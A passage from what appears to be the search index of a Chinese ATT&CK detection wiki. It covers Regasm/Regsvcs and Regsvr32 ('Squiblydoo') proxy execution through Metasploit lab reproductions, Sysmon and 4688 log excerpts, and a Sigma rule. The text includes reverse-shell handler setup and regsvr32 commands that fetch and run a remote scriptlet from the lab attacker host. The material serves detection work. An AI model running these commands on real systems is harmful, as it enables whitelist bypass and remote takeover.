regsvcs.exe\u52a0\u8f7d\u6216\u5378\u8f7d\u6307\u5b9adll\u65f6\u8be5dll\u5fc5\u987b\u7b7e\u540d\u624d\u53ef\u6267\u884c\u6210\u529f\uff0c\u56e0\u6b64\u547d\u4ee4\u4e2d\u4f7f\u7528\u7684key.snk\u6587\u4ef6\u4e3adll\u7b7e\u540d\u6587\u4ef6\uff0c\u662f\u7531sn.exe\u751f\u6210\u7684\u516c\u94a5\u548c\u79c1\u94a5\u5bf9\uff0c\u5982\u679c\u6ca1\u6709sn\u547d\u4ee4\u4f60\u53ef\u80fd\u9700\u8981\u5b89\u88c5vs\u6216\u8005Microsoft SDKs\u3002\u547d\u4ee4\uff1a sn.exe -k key.snk","title":"\u751f\u6210DLL"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_6","text":"\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploits/multi/handler msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > set AutoRunScript migrate f AutoRunScript => migrate f msf5 exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#payload","text":"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U Micropoor.dll C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe Micropoor.dll","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.156 [*] Meterpreter session 2 opened (192.168.126.146:4444 -> 192.168.126.156:49963) at 2020-04-13 17:24:11 +0800 meterpreter > getsid Server SID: S-1-5-21-3661619627-1912079458-2426250727-500","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_7","text":"\u7ecf\u8fc7\u914d\u7f6e\u540e\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a \u8fdb\u7a0b\u4fe1\u606f: #4688-1 \u65b0\u8fdb\u7a0b ID:0x9f8 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U Micropoor.dll \u8fdb\u7a0b\u4fe1\u606f: #4688-2 \u65b0\u8fdb\u7a0b ID:0x8f0 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe Micropoor.dll","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790Regsvcs.exe\u548cRegasm.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83Regsvcs.exe\u548cRegasm.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728Regsvcs.exe\u6216Regasm.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_9","text":"MITRE-ATT&CK-T1218-009 https://attack.mitre.org/techniques/T1218/009/ \u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload https://micro8.gitbook.io/micro8/contents-1/71-80/73-ji-yu-bai-ming-dan-regasm.exe-zhi-hang-payload-di-san-ji \u514d\u6740\u8fdc\u63a7\u4e13\u9898 http://sec.nmask.cn/article_content?a_id=8233eefd6b2671799b46d7cbab7ee672","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/","text":"T1218-010-win-\u57fa\u4e8e\u767d\u540d\u5355Regsvr32\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u547d\u4ee4\u884c\u7a0b\u5e8fRegsvr32.exe\u7528\u4e8e\u5728Windows\u7cfb\u7edf\u4e0a\u6ce8\u518c\u548c\u6ce8\u9500\u5bf9\u8c61\u94fe\u63a5\u53ca\u5d4c\u5165\u63a7\u4ef6\uff0c\u5305\u62ec\u52a8\u6001\u94fe\u63a5\u5e93\uff08DLL\uff09\u3002Regsvr32.exe\u53ef\u7528\u4e8e\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7regsvr32.exe\u8fdb\u7a0b\u6267\u884c\u53ca\u5176\u52a0\u8f7d\u6a21\u5757\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528regsvr32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002Regsvr32.exe\u4e5f\u662f\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 Regsvr32.exe\u8fd8\u53ef\u7528\u4e8e\u4e13\u95e8\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\uff0c\u65b9\u6cd5\u662f\u52a0\u8f7dCOM\u811a\u672c\u5c0f\u7a0b\u5e8f\u5728\u7528\u6237\u6743\u9650\u4e0b\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u7531\u4e8eregsvr32.exe\u5177\u6709\u7f51\u7edc\u548c\u4ee3\u7406\u611f\u77e5\u529f\u80fd\uff0c\u53ef\u4ee5\u5728\u8c03\u7528\u671f\u95f4\u5c06URL\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u5230\u5916\u90e8web\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u6765\u52a0\u8f7d\u811a\u672c\u3002\u6b64\u65b9\u6cd5\u4e0d\u5bf9\u6ce8\u518c\u8868\u8fdb\u884c\u4efb\u4f55\u66f4\u6539\uff0c\u56e0\u4e3aCOM\u5bf9\u8c61\u5b9e\u9645\u4e0a\u672a\u6ce8\u518c\uff0c\u4ec5\u6267\u884c\u3002\u8fd9\u4e2a\u6280\u672f\u53d8\u79cd\u901a\u5e38\u79f0\u4e3a\u201cSquiblydoo\u201d\u653b\u51fb\uff0c\u5df2\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u9488\u5bf9\u653f\u5e9c\u7684\u6d3b\u52a8\u4e2d\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4f1a\u5229\u7528Regsvr32.exe\u6765\u6ce8\u518cCOM\u5bf9\u8c61\u4ee5\u4fbf\u901a\u8fc7COM\u52ab\u6301\u5efa\u7acb\u6301\u4e45\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662f Windows \u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c\u3002WinXP\u53ca\u4ee5\u4e0a\u7cfb\u7edf\u7684regsvr32.exe\u5728windows\\system32\u6587\u4ef6\u5939\u4e0b\uff1b2000\u7cfb\u7edf\u7684regsvr32.exe\u5728winnt\\system32\u6587\u4ef6\u5939\u4e0b\u3002\u4f46\u642d\u914dregsvr32.exe\u4f7f\u7528\u7684 DLL\uff0c\u9700\u8981\u63d0\u4f9b DllRegisterServer \u548c DllUnregisterServer\u4e24\u4e2a\u8f93\u51fa\u51fd\u5f0f\uff0c\u6216\u8005\u63d0\u4f9bDllInstall\u8f93\u51fa\u51fd\u6570\u3002 \u8bf4\u660e\uff1aRegsvr32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cRegsvr32\u547d\u4ee4\u53ef\u8bc6\u522b\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\SysWOW64\\regsvr32.exe C:\\WINDOWS\\system32\\regsvr32.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09 \u653b\u51fb\u5206\u6790 \u914d\u7f6eMSF msf5 > use exploit/multi/script/web_delivery msf5 exploit(multi/script/web_delivery) > set target 3 target => 3 msf5 exploit(multi/script/web_delivery) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/script/web_delivery) > run [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Using URL: http://0.0.0.0:8080/06Yud7aXXqYqT [*] Local IP: http://192.168.126.146:8080/06Yud7aXXqYqT [*] Server started. [*] Run the following command on the target machine: regsvr32 /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll \u9776\u673a\u6267\u884cpayload regsvr32 /s /n /u /i:http://192.168.126.146:8080/jnOUcgr0b0 scrobj.dll \u53cd\u5f39shell msf5 exploit(multi/script/web_delivery) > [*] 192.168.126.149 web_delivery - Handling .sct Request [*] 192.168.126.149 web_delivery - Delivering Payload (1900 bytes) [*] 192.168.126.149 web_delivery - Handling .sct Request \u4ee5\u5931\u8d25\u544a\u7ec8\uff0cwindows powershell\u5df2\u505c\u6b62\u5de5\u4f5c \u6d4b\u8bd5\u7559\u75d5 EventID\uff1a1 Image: C:\\Windows\\System32\\regsvr32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Microsoft(C) Register Server Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: REGSVR32.EXE CommandLine: regsvr32 /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll # sysmon\u65e5\u5fd7 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Regsvr32 Anomaly status: experimental description: Detects various anomalies in relation to regsvr32.exe author: Florian Roth date: 2019/01/16 references: - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html tags: - attack.t1117 - attack.defense_evasion - attack.execution - car.2019-04-002 - car.2019-04-003 logsource: category: process_creation product: windows detection: selection1: Image: '*\\regsvr32.exe' CommandLine: '*\\Temp\\\\*' selection2: Image: '*\\regsvr32.exe' ParentImage: '*\\powershell.exe' selection3: Image: '*\\regsvr32.exe' ParentImage: '*\\cmd.exe' selection4: Image: '*\\regsvr32.exe' CommandLine: - '*/i:http* scrobj.dll' - '*/i:ftp* scrobj.dll' selection5: Image: '*\\wscript.exe' ParentImage: '*\\regsvr32.exe' selection6: Image: '*\\EXCEL.EXE' CommandLine: '*..\\..\\..\\Windows\\System32\\regsvr32.exe *' condition: 1 of them fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high \u5efa\u8bae \u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790regsvr32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83regsvr32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728regsvr32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u811a\u672c\u6216\u8005\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-010 https://attack.mitre.org/techniques/T1218/010/","title":"T1218-010-win-\u57fa\u4e8e\u767d\u540d\u5355Regsvr32\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#t1218-010-win-regsvr32payload","text":"","title":"T1218-010-win-\u57fa\u4e8e\u767d\u540d\u5355Regsvr32\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#attck","text":"\u547d\u4ee4\u884c\u7a0b\u5e8fRegsvr32.exe\u7528\u4e8e\u5728Windows\u7cfb\u7edf\u4e0a\u6ce8\u518c\u548c\u6ce8\u9500\u5bf9\u8c61\u94fe\u63a5\u53ca\u5d4c\u5165\u63a7\u4ef6\uff0c\u5305\u62ec\u52a8\u6001\u94fe\u63a5\u5e93\uff08DLL\uff09\u3002Regsvr32.exe\u53ef\u7528\u4e8e\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7regsvr32.exe\u8fdb\u7a0b\u6267\u884c\u53ca\u5176\u52a0\u8f7d\u6a21\u5757\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528regsvr32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002Regsvr32.exe\u4e5f\u662f\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 Regsvr32.exe\u8fd8\u53ef\u7528\u4e8e\u4e13\u95e8\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\uff0c\u65b9\u6cd5\u662f\u52a0\u8f7dCOM\u811a\u672c\u5c0f\u7a0b\u5e8f\u5728\u7528\u6237\u6743\u9650\u4e0b\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u7531\u4e8eregsvr32.exe\u5177\u6709\u7f51\u7edc\u548c\u4ee3\u7406\u611f\u77e5\u529f\u80fd\uff0c\u53ef\u4ee5\u5728\u8c03\u7528\u671f\u95f4\u5c06URL\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u5230\u5916\u90e8web\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u6765\u52a0\u8f7d\u811a\u672c\u3002\u6b64\u65b9\u6cd5\u4e0d\u5bf9\u6ce8\u518c\u8868\u8fdb\u884c\u4efb\u4f55\u66f4\u6539\uff0c\u56e0\u4e3aCOM\u5bf9\u8c61\u5b9e\u9645\u4e0a\u672a\u6ce8\u518c\uff0c\u4ec5\u6267\u884c\u3002\u8fd9\u4e2a\u6280\u672f\u53d8\u79cd\u901a\u5e38\u79f0\u4e3a\u201cSquiblydoo\u201d\u653b\u51fb\uff0c\u5df2\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u9488\u5bf9\u653f\u5e9c\u7684\u6d3b\u52a8\u4e2d\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4f1a\u5229\u7528Regsvr32.exe\u6765\u6ce8\u518cCOM\u5bf9\u8c61\u4ee5\u4fbf\u901a\u8fc7COM\u52ab\u6301\u5efa\u7acb\u6301\u4e45\u6027\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662f Windows \u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c\u3002WinXP\u53ca\u4ee5\u4e0a\u7cfb\u7edf\u7684regsvr32.exe\u5728windows\\system32\u6587\u4ef6\u5939\u4e0b\uff1b2000\u7cfb\u7edf\u7684regsvr32.exe\u5728winnt\\system32\u6587\u4ef6\u5939\u4e0b\u3002\u4f46\u642d\u914dregsvr32.exe\u4f7f\u7528\u7684 DLL\uff0c\u9700\u8981\u63d0\u4f9b DllRegisterServer \u548c DllUnregisterServer\u4e24\u4e2a\u8f93\u51fa\u51fd\u5f0f\uff0c\u6216\u8005\u63d0\u4f9bDllInstall\u8f93\u51fa\u51fd\u6570\u3002 \u8bf4\u660e\uff1aRegsvr32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cRegsvr32\u547d\u4ee4\u53ef\u8bc6\u522b\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\SysWOW64\\regsvr32.exe C:\\WINDOWS\\system32\\regsvr32.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msf5 > use exploit/multi/script/web_delivery msf5 exploit(multi/script/web_delivery) > set target 3 target => 3 msf5 exploit(multi/script/web_delivery) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/script/web_delivery) > run [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Using URL: http://0.0.0.0:8080/06Yud7aXXqYqT [*] Local IP: http://192.168.126.146:8080/06Yud7aXXqYqT [*] Server started. [*] Run the following command on the target machine: regsvr32 /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll","title":"\u914d\u7f6eMSF"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#payload","text":"regsvr32 /s /n /u /i:http://192.168.126.146:8080/jnOUcgr0b0 scrobj.dll","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#shell","text":"msf5 exploit(multi/script/web_delivery) > [*] 192.168.126.149 web_delivery - Handling .sct Request [*] 192.168.126.149 web_delivery - Delivering Payload (1900 bytes) [*] 192.168.126.149 web_delivery - Handling .sct Request \u4ee5\u5931\u8d25\u544a\u7ec8\uff0cwindows powershell\u5df2\u505c\u6b62\u5de5\u4f5c","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_6","text":"EventID\uff1a1 Image: C:\\Windows\\System32\\regsvr32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Microsoft(C) Register Server Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: REGSVR32.EXE CommandLine: regsvr32 /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll # sysmon\u65e5\u5fd7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#sigma","text":"title: Regsvr32 Anomaly status: experimental description: Detects various anomalies in relation to regsvr32.exe author: Florian Roth date: 2019/01/16 references: - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html tags: - attack.t1117 - attack.defense_evasion - attack.execution - car.2019-04-002 - car.2019-04-003 logsource: category: process_creation product: windows detection: selection1: Image: '*\\regsvr32.exe' CommandLine: '*\\Temp\\\\*' selection2: Image: '*\\regsvr32.exe' ParentImage: '*\\powershell.exe' selection3: Image: '*\\regsvr32.exe' ParentImage: '*\\cmd.exe' selection4: Image: '*\\regsvr32.exe' CommandLine: - '*/i:http* scrobj.dll' - '*/i:ftp* scrobj.dll' selection5: Image: '*\\wscript.exe' ParentImage: '*\\regsvr32.exe' selection6: Image: '*\\EXCEL.EXE' CommandLine: '*..\\..\\..\\Windows\\System32\\regsvr32.exe *' condition: 1 of them fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: 